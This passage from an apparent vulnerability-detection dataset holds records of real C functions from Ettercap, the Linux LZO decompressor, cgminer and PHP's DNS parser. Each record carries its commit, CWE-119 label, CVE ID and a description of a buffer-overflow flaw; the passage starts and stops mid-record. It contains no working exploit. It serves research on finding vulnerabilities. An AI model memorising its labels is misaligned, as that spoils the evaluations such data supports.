\"\\x00\\x00\\x00\\x0c\", 4)  &&\n               !memcmp(ptr + 5, \"\\x00\\x00\\x00\\x05\", 4)) {\n\n            conn_status->status = WAIT_RESPONSE;\n\n            conn_status->type = MD5;\n            DEBUG_MSG(\"\\tDissector_postgresql AUTH type is MD5\");\n            hex_encode(ptr + 9, 4, conn_status->salt); /* save salt */\n         }\n         else if (conn_status->status == WAIT_AUTH &&\n               ptr[0] == 'R' && !memcmp(ptr + 1, \"\\x00\\x00\\x00\\x08\", 4)  &&\n               !memcmp(ptr + 5, \"\\x00\\x00\\x00\\x03\", 4)) {\n            conn_status->status = WAIT_RESPONSE;\n            conn_status->type = CT;\n            DEBUG_MSG(\"\\tDissector_postgresql AUTH type is clear-text!\");\n         }\n      }\n   }\n\n   SAFE_FREE(ident);\n   return NULL;\n}\n", "func_hash": 235532748321396994144876978388407276282, "file_name": "ec_postgresql.c", "file_hash": 284688323983812357703764325378348258333, "cwe": ["CWE-119"], "cve": "CVE-2014-6395", "cve_desc": "Heap-based buffer overflow in the dissector_postgresql function in dissectors/ec_postgresql.c in Ettercap before 0.8.1 allows remote attackers to cause a denial of service or possibly execute arbitrary code via a crafted password length value that is inconsistent with the actual length of the password.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6395"}
{"idx": 158993, "project": "linux", "commit_id": "206a81c18401c0cde6e579164f752c4b147324ce", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/206a81c18401c0cde6e579164f752c4b147324ce", "commit_message": "lzo: properly check for overruns\n\nThe lzo decompressor can, if given some really crazy data, possibly\noverrun some variable types.  Modify the checking logic to properly\ndetect overruns before they happen.\n\nReported-by: \"Don A. Bailey\" <donb@securitymouse.com>\nTested-by: \"Don A. Bailey\" <donb@securitymouse.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>", "target": 0, "func": " int lzo1x_decompress_safe(const unsigned char *in, size_t in_len,\n \t\t\t  unsigned char *out, size_t *out_len)\n{\n\tunsigned char *op;\n\tconst unsigned char *ip;\n\tsize_t t, next;\n\tsize_t state = 0;\n\tconst unsigned char *m_pos;\n\tconst unsigned char * const ip_end = in + in_len;\n\tunsigned char * const op_end = out + *out_len;\n\n\top = out;\n\tip = in;\n\n\tif (unlikely(in_len < 3))\n\t\tgoto input_overrun;\n\tif (*ip > 17) {\n\t\tt = *ip++ - 17;\n\t\tif (t < 4) {\n\t\t\tnext = t;\n\t\t\tgoto match_next;\n\t\t}\n\t\tgoto copy_literal_run;\n\t}\n\n\tfor (;;) {\n\t\tt = *ip++;\n\t\tif (t < 16) {\n\t\t\tif (likely(state == 0)) {\n\t\t\t\tif (unlikely(t == 0)) {\n \t\t\t\t\twhile (unlikely(*ip == 0)) {\n \t\t\t\t\t\tt += 255;\n \t\t\t\t\t\tip++;\n\t\t\t\t\t\tNEED_IP(1, 0);\n \t\t\t\t\t}\n \t\t\t\t\tt += 15 + *ip++;\n \t\t\t\t}\n \t\t\t\tt += 3;\n copy_literal_run:\n #if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)\n\t\t\t\tif (likely(HAVE_IP(t, 15) && HAVE_OP(t, 15))) {\n \t\t\t\t\tconst unsigned char *ie = ip + t;\n \t\t\t\t\tunsigned char *oe = op + t;\n \t\t\t\t\tdo {\n\t\t\t\t\t\tCOPY8(op, ip);\n\t\t\t\t\t\top += 8;\n\t\t\t\t\t\tip += 8;\n\t\t\t\t\t\tCOPY8(op, ip);\n\t\t\t\t\t\top += 8;\n\t\t\t\t\t\tip += 8;\n\t\t\t\t\t} while (ip < ie);\n\t\t\t\t\tip = ie;\n\t\t\t\t\top = oe;\n \t\t\t\t} else\n #endif\n \t\t\t\t{\n\t\t\t\t\tNEED_OP(t, 0);\n\t\t\t\t\tNEED_IP(t, 3);\n \t\t\t\t\tdo {\n \t\t\t\t\t\t*op++ = *ip++;\n \t\t\t\t\t} while (--t > 0);\n\t\t\t\t}\n\t\t\t\tstate = 4;\n\t\t\t\tcontinue;\n\t\t\t} else if (state != 4) {\n\t\t\t\tnext = t & 3;\n\t\t\t\tm_pos = op - 1;\n \t\t\t\tm_pos -= t >> 2;\n \t\t\t\tm_pos -= *ip++ << 2;\n \t\t\t\tTEST_LB(m_pos);\n\t\t\t\tNEED_OP(2, 0);\n \t\t\t\top[0] = m_pos[0];\n \t\t\t\top[1] = m_pos[1];\n \t\t\t\top += 2;\n\t\t\t\tgoto match_next;\n\t\t\t} else {\n\t\t\t\tnext = t & 3;\n\t\t\t\tm_pos = op - (1 + M2_MAX_OFFSET);\n\t\t\t\tm_pos -= t >> 2;\n\t\t\t\tm_pos -= *ip++ << 2;\n\t\t\t\tt = 3;\n\t\t\t}\n\t\t} else if (t >= 64) {\n\t\t\tnext = t & 3;\n\t\t\tm_pos = op - 1;\n\t\t\tm_pos -= (t >> 2) & 7;\n\t\t\tm_pos -= *ip++ << 3;\n\t\t\tt = (t >> 5) - 1 + (3 - 1);\n\t\t} else if (t >= 32) {\n\t\t\tt = (t & 31) + (3 - 1);\n\t\t\tif (unlikely(t == 2)) {\n \t\t\t\twhile (unlikely(*ip == 0)) {\n \t\t\t\t\tt += 255;\n \t\t\t\t\tip++;\n\t\t\t\t\tNEED_IP(1, 0);\n \t\t\t\t}\n \t\t\t\tt += 31 + *ip++;\n\t\t\t\tNEED_IP(2, 0);\n \t\t\t}\n \t\t\tm_pos = op - 1;\n \t\t\tnext = get_unaligned_le16(ip);\n\t\t\tip += 2;\n\t\t\tm_pos -= next >> 2;\n\t\t\tnext &= 3;\n\t\t} else {\n\t\t\tm_pos = op;\n\t\t\tm_pos -= (t & 8) << 11;\n\t\t\tt = (t & 7) + (3 - 1);\n\t\t\tif (unlikely(t == 2)) {\n \t\t\t\twhile (unlikely(*ip == 0)) {\n \t\t\t\t\tt += 255;\n \t\t\t\t\tip++;\n\t\t\t\t\tNEED_IP(1, 0);\n \t\t\t\t}\n \t\t\t\tt += 7 + *ip++;\n\t\t\t\tNEED_IP(2, 0);\n \t\t\t}\n \t\t\tnext = get_unaligned_le16(ip);\n \t\t\tip += 2;\n\t\t\tm_pos -= next >> 2;\n\t\t\tnext &= 3;\n\t\t\tif (m_pos == op)\n\t\t\t\tgoto eof_found;\n\t\t\tm_pos -= 0x4000;\n\t\t}\n\t\tTEST_LB(m_pos);\n #if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)\n \t\tif (op - m_pos >= 8) {\n \t\t\tunsigned char *oe = op + t;\n\t\t\tif (likely(HAVE_OP(t, 15))) {\n \t\t\t\tdo {\n \t\t\t\t\tCOPY8(op, m_pos);\n \t\t\t\t\top += 8;\n\t\t\t\t\tm_pos += 8;\n\t\t\t\t\tCOPY8(op, m_pos);\n\t\t\t\t\top += 8;\n \t\t\t\t\tm_pos += 8;\n \t\t\t\t} while (op < oe);\n \t\t\t\top = oe;\n\t\t\t\tif (HAVE_IP(6, 0)) {\n \t\t\t\t\tstate = next;\n \t\t\t\t\tCOPY4(op, ip);\n \t\t\t\t\top += next;\n \t\t\t\t\tip += next;\n \t\t\t\t\tcontinue;\n \t\t\t\t}\n \t\t\t} else {\n\t\t\t\tNEED_OP(t, 0);\n \t\t\t\tdo {\n \t\t\t\t\t*op++ = *m_pos++;\n \t\t\t\t} while (op < oe);\n\t\t\t}\n\t\t} else\n #endif\n \t\t{\n \t\t\tunsigned char *oe = op + t;\n\t\t\tNEED_OP(t, 0);\n \t\t\top[0] = m_pos[0];\n \t\t\top[1] = m_pos[1];\n \t\t\top += 2;\n\t\t\tm_pos += 2;\n\t\t\tdo {\n\t\t\t\t*op++ = *m_pos++;\n\t\t\t} while (op < oe);\n\t\t}\nmatch_next:\n \t\tstate = next;\n \t\tt = next;\n #if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)\n\t\tif (likely(HAVE_IP(6, 0) && HAVE_OP(4, 0))) {\n \t\t\tCOPY4(op, ip);\n \t\t\top += t;\n \t\t\tip += t;\n \t\t} else\n #endif\n \t\t{\n\t\t\tNEED_IP(t, 3);\n\t\t\tNEED_OP(t, 0);\n \t\t\twhile (t > 0) {\n \t\t\t\t*op++ = *ip++;\n \t\t\t\tt--;\n\t\t\t}\n\t\t}\n\t}\n\neof_found:\n\t*out_len = op - out;\n\treturn (t != 3       ? LZO_E_ERROR :\n\t\tip == ip_end ? LZO_E_OK :\n\t\tip <  ip_end ? LZO_E_INPUT_NOT_CONSUMED : LZO_E_INPUT_OVERRUN);\n\ninput_overrun:\n\t*out_len = op - out;\n\treturn LZO_E_INPUT_OVERRUN;\n\noutput_overrun:\n\t*out_len = op - out;\n\treturn LZO_E_OUTPUT_OVERRUN;\n\nlookbehind_overrun:\n\t*out_len = op - out;\n\treturn LZO_E_LOOKBEHIND_OVERRUN;\n}\n", "func_hash": 174542836292707064346123364054688261425, "file_name": "lzo1x_decompress_safe.c", "file_hash": 52351594738285981777573668229644280332, "cwe": ["CWE-119"], "cve": "CVE-2014-4608", "cve_desc": "Multiple integer overflows in the lzo1x_decompress_safe function in lib/lzo/lzo1x_decompress_safe.c in the LZO decompressor in the Linux kernel before 3.15.2 allow context-dependent attackers to cause a denial of service (memory corruption) via a crafted Literal Run.  NOTE: the author of the LZO algorithms says \"the Linux kernel is *not* affected; media hype.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4608"}
{"idx": 158995, "project": "cgminer", "commit_id": "e1c5050734123973b99d181c45e74b2cbb00272e", "project_url": "https://github.com/ckolivas/cgminer", "commit_url": "https://github.com/ckolivas/cgminer/commit/e1c5050734123973b99d181c45e74b2cbb00272e", "commit_message": "Do some random sanity checking for stratum message parsing", "target": 0, "func": "bool extract_sockaddr(char *url, char **sockaddr_url, char **sockaddr_port)\n{\n\tchar *url_begin, *url_end, *ipv6_begin, *ipv6_end, *port_start = NULL;\n\tchar url_address[256], port[6];\n\tint url_len, port_len = 0;\n\n\t*sockaddr_url = url;\n\turl_begin = strstr(url, \"//\");\n\tif (!url_begin)\n\t\turl_begin = url;\n\telse\n\t\turl_begin += 2;\n\n\t/* Look for numeric ipv6 entries */\n\tipv6_begin = strstr(url_begin, \"[\");\n\tipv6_end = strstr(url_begin, \"]\");\n\tif (ipv6_begin && ipv6_end && ipv6_end > ipv6_begin)\n\t\turl_end = strstr(ipv6_end, \":\");\n\telse\n\t\turl_end = strstr(url_begin, \":\");\n\tif (url_end) {\n\t\turl_len = url_end - url_begin;\n\t\tport_len = strlen(url_begin) - url_len - 1;\n\t\tif (port_len < 1)\n\t\t\treturn false;\n\t\tport_start = url_end + 1;\n\t} else\n\t\turl_len = strlen(url_begin);\n\n \tif (url_len < 1)\n \t\treturn false;\n \n\tsnprintf(url_address, 254, \"%.*s\", url_len, url_begin);\n \n \tif (port_len) {\n \t\tchar *slash;\n\n\t\tsnprintf(port, 6, \"%.*s\", port_len, port_start);\n\t\tslash = strchr(port, '/');\n\t\tif (slash)\n\t\t\t*slash = '\\0';\n\t} else\n\t\tstrcpy(port, \"80\");\n\n\t*sockaddr_port = strdup(port);\n\t*sockaddr_url = strdup(url_address);\n\n\treturn true;\n}\n", "func_hash": 278891602713911521721232005627227442838, "file_name": "util.c", "file_hash": 129321568267466402159371811359101293858, "cwe": ["CWE-119"], "cve": "CVE-2014-4502", "cve_desc": "Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4502"}
{"idx": 158996, "project": "cgminer", "commit_id": "e1c5050734123973b99d181c45e74b2cbb00272e", "project_url": "https://github.com/ckolivas/cgminer", "commit_url": "https://github.com/ckolivas/cgminer/commit/e1c5050734123973b99d181c45e74b2cbb00272e", "commit_message": "Do some random sanity checking for stratum message parsing", "target": 0, "func": "static bool parse_notify(struct pool *pool, json_t *val)\n{\n\tchar *job_id, *prev_hash, *coinbase1, *coinbase2, *bbversion, *nbit,\n\t     *ntime, header[228];\n\tunsigned char *cb1 = NULL, *cb2 = NULL;\n\tsize_t cb1_len, cb2_len, alloc_len;\n\tbool clean, ret = false;\n\tint merkles, i;\n\tjson_t *arr;\n\n\tarr = json_array_get(val, 4);\n\tif (!arr || !json_is_array(arr))\n\t\tgoto out;\n\n\tmerkles = json_array_size(arr);\n\n\tjob_id = json_array_string(val, 0);\n\tprev_hash = __json_array_string(val, 1);\n\tcoinbase1 = json_array_string(val, 2);\n\tcoinbase2 = json_array_string(val, 3);\n\tbbversion = __json_array_string(val, 5);\n\tnbit = __json_array_string(val, 6);\n \tntime = __json_array_string(val, 7);\n \tclean = json_is_true(json_array_get(val, 8));\n \n\tif (!valid_hex(job_id) || !valid_hex(prev_hash) || !valid_hex(coinbase1) ||\n\t    !valid_hex(coinbase2) || !valid_hex(bbversion) || !valid_hex(nbit) ||\n\t    !valid_hex(ntime)) {\n \t\t/* Annoying but we must not leak memory */\n\t\tfree(job_id);\n\t\tfree(coinbase1);\n\t\tfree(coinbase2);\n \t\tgoto out;\n \t}\n \n\tcg_wlock(&pool->data_lock);\n\tfree(pool->swork.job_id);\n\tpool->swork.job_id = job_id;\n\tsnprintf(pool->prev_hash, 65, \"%s\", prev_hash);\n\tcb1_len = strlen(coinbase1) / 2;\n\tcb2_len = strlen(coinbase2) / 2;\n\tsnprintf(pool->bbversion, 9, \"%s\", bbversion);\n\tsnprintf(pool->nbit, 9, \"%s\", nbit);\n\tsnprintf(pool->ntime, 9, \"%s\", ntime);\n\tpool->swork.clean = clean;\n\talloc_len = pool->coinbase_len = cb1_len + pool->n1_len + pool->n2size + cb2_len;\n\tpool->nonce2_offset = cb1_len + pool->n1_len;\n\n\tfor (i = 0; i < pool->merkles; i++)\n\t\tfree(pool->swork.merkle_bin[i]);\n\tif (merkles) {\n\t\tpool->swork.merkle_bin = realloc(pool->swork.merkle_bin,\n\t\t\t\t\t\t sizeof(char *) * merkles + 1);\n\t\tfor (i = 0; i < merkles; i++) {\n\t\t\tchar *merkle = json_array_string(arr, i);\n\n\t\t\tpool->swork.merkle_bin[i] = malloc(32);\n\t\t\tif (unlikely(!pool->swork.merkle_bin[i]))\n\t\t\t\tquit(1, \"Failed to malloc pool swork merkle_bin\");\n\t\t\tif (opt_protocol)\n\t\t\t\tapplog(LOG_DEBUG, \"merkle %d: %s\", i, merkle);\n\t\t\tret = hex2bin(pool->swork.merkle_bin[i], merkle, 32);\n\t\t\tfree(merkle);\n\t\t\tif (unlikely(!ret)) {\n\t\t\t\tapplog(LOG_ERR, \"Failed to convert merkle to merkle_bin in parse_notify\");\n\t\t\t\tgoto out_unlock;\n\t\t\t}\n\t\t}\n\t}\n\tpool->merkles = merkles;\n\tif (clean)\n\t\tpool->nonce2 = 0;\n#if 0\n\theader_len = \t\t strlen(pool->bbversion) +\n\t\t\t\t strlen(pool->prev_hash);\n\t/* merkle_hash */\t 32 +\n\t\t\t\t strlen(pool->ntime) +\n\t\t\t\t strlen(pool->nbit) +\n\t/* nonce */\t\t 8 +\n\t/* workpadding */\t 96;\n#endif\n\tsnprintf(header, 225,\n\t\t\"%s%s%s%s%s%s%s\",\n\t\tpool->bbversion,\n\t\tpool->prev_hash,\n\t\tblank_merkle,\n\t\tpool->ntime,\n\t\tpool->nbit,\n\t\t\"00000000\", /* nonce */\n\t\tworkpadding);\n\tret = hex2bin(pool->header_bin, header, 112);\n\tif (unlikely(!ret)) {\n\t\tapplog(LOG_ERR, \"Failed to convert header to header_bin in parse_notify\");\n\t\tgoto out_unlock;\n\t}\n\n\tcb1 = alloca(cb1_len);\n\tret = hex2bin(cb1, coinbase1, cb1_len);\n\tif (unlikely(!ret)) {\n\t\tapplog(LOG_ERR, \"Failed to convert cb1 to cb1_bin in parse_notify\");\n\t\tgoto out_unlock;\n\t}\n\tcb2 = alloca(cb2_len);\n\tret = hex2bin(cb2, coinbase2, cb2_len);\n\tif (unlikely(!ret)) {\n\t\tapplog(LOG_ERR, \"Failed to convert cb2 to cb2_bin in parse_notify\");\n\t\tgoto out_unlock;\n\t}\n\tfree(pool->coinbase);\n\talign_len(&alloc_len);\n\tpool->coinbase = calloc(alloc_len, 1);\n\tif (unlikely(!pool->coinbase))\n\t\tquit(1, \"Failed to calloc pool coinbase in parse_notify\");\n\tmemcpy(pool->coinbase, cb1, cb1_len);\n\tmemcpy(pool->coinbase + cb1_len, pool->nonce1bin, pool->n1_len);\n\tmemcpy(pool->coinbase + cb1_len + pool->n1_len + pool->n2size, cb2, cb2_len);\n\tif (opt_debug) {\n\t\tchar *cb = bin2hex(pool->coinbase, pool->coinbase_len);\n\n\t\tapplog(LOG_DEBUG, \"Pool %d coinbase %s\", pool->pool_no, cb);\n\t\tfree(cb);\n\t}\nout_unlock:\n\tcg_wunlock(&pool->data_lock);\n\n\tif (opt_protocol) {\n\t\tapplog(LOG_DEBUG, \"job_id: %s\", job_id);\n\t\tapplog(LOG_DEBUG, \"prev_hash: %s\", prev_hash);\n\t\tapplog(LOG_DEBUG, \"coinbase1: %s\", coinbase1);\n\t\tapplog(LOG_DEBUG, \"coinbase2: %s\", coinbase2);\n\t\tapplog(LOG_DEBUG, \"bbversion: %s\", bbversion);\n\t\tapplog(LOG_DEBUG, \"nbit: %s\", nbit);\n\t\tapplog(LOG_DEBUG, \"ntime: %s\", ntime);\n\t\tapplog(LOG_DEBUG, \"clean: %s\", clean ? \"yes\" : \"no\");\n\t}\n\tfree(coinbase1);\n\tfree(coinbase2);\n\n\t/* A notify message is the closest stratum gets to a getwork */\n\tpool->getwork_requested++;\n\ttotal_getworks++;\n\tif (pool == current_pool())\n\t\topt_work_update = true;\nout:\n\treturn ret;\n}\n", "func_hash": 31220049300174421749951479975200364815, "file_name": "util.c", "file_hash": 129321568267466402159371811359101293858, "cwe": ["CWE-119"], "cve": "CVE-2014-4502", "cve_desc": "Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4502"}
{"idx": 158997, "project": "cgminer", "commit_id": "e1c5050734123973b99d181c45e74b2cbb00272e", "project_url": "https://github.com/ckolivas/cgminer", "commit_url": "https://github.com/ckolivas/cgminer/commit/e1c5050734123973b99d181c45e74b2cbb00272e", "commit_message": "Do some random sanity checking for stratum message parsing", "target": 0, "func": "static bool parse_reconnect(struct pool *pool, json_t *val)\n{\n\tchar *sockaddr_url, *stratum_port, *tmp;\n\tchar *url, *port, address[256];\n\n\tmemset(address, 0, 255);\n\turl = (char *)json_string_value(json_array_get(val, 0));\n\tif (!url)\n\t\turl = pool->sockaddr_url;\n\telse {\n\t\tchar *dot_pool, *dot_reconnect;\n\t\tdot_pool = strchr(pool->sockaddr_url, '.');\n\t\tif (!dot_pool) {\n\t\t\tapplog(LOG_ERR, \"Denied stratum reconnect request for pool without domain '%s'\",\n\t\t\t       pool->sockaddr_url);\n\t\t\treturn false;\n\t\t}\n\t\tdot_reconnect = strchr(url, '.');\n\t\tif (!dot_reconnect) {\n\t\t\tapplog(LOG_ERR, \"Denied stratum reconnect request to url without domain '%s'\",\n\t\t\t       url);\n\t\t\treturn false;\n\t\t}\n\t\tif (strcmp(dot_pool, dot_reconnect)) {\n\t\t\tapplog(LOG_ERR, \"Denied stratum reconnect request to non-matching domain url '%s'\",\n\t\t\t\tpool->sockaddr_url);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\tport = (char *)json_string_value(json_array_get(val, 1));\n \tif (!port)\n \t\tport = pool->stratum_port;\n \n\tsnprintf(address, 254, \"%s:%s\", url, port);\n \n \tif (!extract_sockaddr(address, &sockaddr_url, &stratum_port))\n \t\treturn false;\n\n\tapplog(LOG_WARNING, \"Stratum reconnect requested from pool %d to %s\", pool->pool_no, address);\n\n\tclear_pool_work(pool);\n\n\tmutex_lock(&pool->stratum_lock);\n\t__suspend_stratum(pool);\n\ttmp = pool->sockaddr_url;\n\tpool->sockaddr_url = sockaddr_url;\n\tpool->stratum_url = pool->sockaddr_url;\n\tfree(tmp);\n\ttmp = pool->stratum_port;\n\tpool->stratum_port = stratum_port;\n\tfree(tmp);\n\tmutex_unlock(&pool->stratum_lock);\n\n\tif (!restart_stratum(pool)) {\n\t\tpool_failed(pool);\n\t\treturn false;\n\t}\n\n\treturn true;\n}\n", "func_hash": 279622017893359295959670642401765328571, "file_name": "util.c", "file_hash": 129321568267466402159371811359101293858, "cwe": ["CWE-119"], "cve": "CVE-2014-4502", "cve_desc": "Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-4502"}
{"idx": 158999, "project": "php-src", "commit_id": "b34d7849ed90ced9345f8ea1c59bc8d101c18468", "project_url": "https://github.com/php/php-src", "commit_url": "https://github.com/php/php-src/commit/b34d7849ed90ced9345f8ea1c59bc8d101c18468", "commit_message": "Merge branch 'PHP-5.6'\n\n* PHP-5.6:\n  Fix potential segfault in dns_get_record()", "target": 0, "func": "static u_char *php_parserr(u_char *cp, querybuf *answer, int type_to_fetch, int store, int raw, zval **subarray)\n{\n\tu_short type, class, dlen;\n\tu_long ttl;\n\tlong n, i;\n\tu_short s;\n\tu_char *tp, *p;\n\tchar name[MAXHOSTNAMELEN];\n\tint have_v6_break = 0, in_v6_break = 0;\n\n\t*subarray = NULL;\n\n\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, sizeof(name) - 2);\n\tif (n < 0) {\n\t\treturn NULL;\n\t}\n\tcp += n;\n\n\tGETSHORT(type, cp);\n\tGETSHORT(class, cp);\n\tGETLONG(ttl, cp);\n\tGETSHORT(dlen, cp);\n\tif (type_to_fetch != T_ANY && type != type_to_fetch) {\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tif (!store) {\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tALLOC_INIT_ZVAL(*subarray);\n\tarray_init(*subarray);\n\n\tadd_assoc_string(*subarray, \"host\", name, 1);\n\tadd_assoc_string(*subarray, \"class\", \"IN\", 1);\n\tadd_assoc_long(*subarray, \"ttl\", ttl);\n\n\tif (raw) {\n\t\tadd_assoc_long(*subarray, \"type\", type);\n\t\tadd_assoc_stringl(*subarray, \"data\", (char*) cp, (uint) dlen, 1);\n\t\tcp += dlen;\n\t\treturn cp;\n\t}\n\n\tswitch (type) {\n\t\tcase DNS_T_A:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"A\", 1);\n\t\t\tsnprintf(name, sizeof(name), \"%d.%d.%d.%d\", cp[0], cp[1], cp[2], cp[3]);\n\t\t\tadd_assoc_string(*subarray, \"ip\", name, 1);\n\t\t\tcp += dlen;\n\t\t\tbreak;\n\t\tcase DNS_T_MX:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"MX\", 1);\n\t\t\tGETSHORT(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"pri\", n);\n\t\t\t/* no break; */\n\t\tcase DNS_T_CNAME:\n\t\t\tif (type == DNS_T_CNAME) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"CNAME\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_NS:\n\t\t\tif (type == DNS_T_NS) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"NS\", 1);\n\t\t\t}\n\t\t\t/* no break; */\n\t\tcase DNS_T_PTR:\n\t\t\tif (type == DNS_T_PTR) {\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"PTR\", 1);\n\t\t\t}\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) - 2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"target\", name, 1);\n\t\t\tbreak;\n\t\tcase DNS_T_HINFO:\n\t\t\t/* See RFC 1010 for values */\n\t\t\tadd_assoc_string(*subarray, \"type\", \"HINFO\", 1);\n\t\t\tn = *cp & 0xFF;\n\t\t\tcp++;\n\t\t\tadd_assoc_stringl(*subarray, \"cpu\", (char*)cp, n, 1);\n\t\t\tcp += n;\n\t\t\tn = *cp & 0xFF;\n\t\t\tcp++;\n\t\t\tadd_assoc_stringl(*subarray, \"os\", (char*)cp, n, 1);\n\t\t\tcp += n;\n\t\t\tbreak;\n\t\tcase DNS_T_TXT:\n\t\t\t{\n\t\t\t\tint ll = 0;\n\t\t\t\tzval *entries = NULL;\n\n\t\t\t\tadd_assoc_string(*subarray, \"type\", \"TXT\", 1);\n\t\t\t\ttp = emalloc(dlen + 1);\n\t\t\t\t\n\t\t\t\tMAKE_STD_ZVAL(entries);\n\t\t\t\tarray_init(entries);\n \t\t\t\t\n \t\t\t\twhile (ll < dlen) {\n \t\t\t\t\tn = cp[ll];\n\t\t\t\t\tif ((ll + n) >= dlen) {\n\t\t\t\t\t\t// Invalid chunk length, truncate\n\t\t\t\t\t\tn = dlen - (ll + 1);\n\t\t\t\t\t}\n \t\t\t\t\tmemcpy(tp + ll , cp + ll + 1, n);\n \t\t\t\t\tadd_next_index_stringl(entries, cp + ll + 1, n, 1);\n \t\t\t\t\tll = ll + n + 1;\n\t\t\t\t}\n\t\t\t\ttp[dlen] = '\\0';\n\t\t\t\tcp += dlen;\n\n\t\t\t\tadd_assoc_stringl(*subarray, \"txt\", tp, (dlen>0)?dlen - 1:0, 0);\n\t\t\t\tadd_assoc_zval(*subarray, \"entries\", entries);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase DNS_T_SOA:\n\t\t\tadd_assoc_string(*subarray, \"type\", \"SOA\", 1);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) -2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"mname\", name, 1);\n\t\t\tn = dn_expand(answer->qb2, answer->qb2+65536, cp, name, (sizeof name) -2);\n\t\t\tif (n < 0) {\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tcp += n;\n\t\t\tadd_assoc_string(*subarray, \"rname\", name, 1);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"serial\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"refresh\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"retry\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"expire\", n);\n\t\t\tGETLONG(n, cp);\n\t\t\tadd_assoc_long(*subarray, \"minimum-ttl\", n);\n\t\t\tbreak;\n\t\tcase DNS_T_AAAA:\n\t\t\ttp = (u_char*)name;\n\t\t\tfor(i=0; i < 8; i++) {\n\t\t\t\tGETSHORT(s, cp);\n\t\t\t\tif (s != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\ttp += sprintf((char*)tp,\"%x\",s);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} else if (!in_v6_break) {\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t\ttp[0] = '0';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (have_v6_break && in_v6_break) {\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\ttp[0] = '\\0';\n\t\t\tadd_assoc_string(*subarray, \"type\", \"AAAA\", 1);\n\t\t\tadd_assoc_string(*subarray, \"ipv6\", name, 1);\n\t\t\tbreak;\n\t\tcase DNS_T_A6:\n\t\t\tp = cp;\n\t\t\tadd_assoc_string(*subarray, \"type\", \"A6\", 1);\n\t\t\tn = ((int)cp[0]) & 0xFF;\n\t\t\tcp++;\n\t\t\tadd_assoc_long(*subarray, \"masklen\", n);\n\t\t\ttp = (u_char*)name;\n\t\t\tif (n > 15) {\n\t\t\t\thave_v6_break = 1;\n\t\t\t\tin_v6_break = 1;\n\t\t\t\ttp[0] = ':';\n\t\t\t\ttp++;\n\t\t\t}\n\t\t\tif (n % 16 > 8) {\n\t\t\t\t/* Partial short */\n\t\t\t\tif (cp[0] != 0) {\n\t\t\t\t\tif (tp > (u_char *)name) {\n\t\t\t\t\t\tin_v6_break = 0;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t}\n\t\t\t\t\tsprintf((char*)tp, \"%x\", cp[0] & 0xFF);\n\t\t\t\t} else {\n\t\t\t\t\tif (!have_v6_break) {\n\t\t\t\t\t\thave_v6_break = 1;\n\t\t\t\t\t\tin_v6_break = 1;\n\t\t\t\t\t\ttp[0] = ':';\n\t\t\t\t\t\ttp++;\n\t\t\t\t\t} 